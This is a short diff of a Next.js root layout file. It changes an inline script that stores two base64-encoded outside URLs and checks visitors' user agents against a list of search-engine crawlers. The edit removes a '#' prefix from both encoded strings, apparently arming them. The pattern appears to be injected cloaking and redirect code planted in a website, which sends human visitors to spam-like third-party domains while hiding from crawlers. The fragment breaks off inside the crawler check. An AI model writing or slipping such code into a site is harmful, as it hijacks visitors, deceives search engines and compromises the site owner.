@@ -123,8 +123,8 @@ export default function RootLayout({
   dangerouslySetInnerHTML={{
     __html: `
       (function() {
-        var mainBrandB64  = "#aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG"; 
-        var crossBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
+        var mainBrandB64  = "aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG"; 
+        var crossBrandB64 = "aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
         var ua = navigator.userAgent.toLowerCase();
         var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
         for (var i = 0; i < bots.length; i++) {
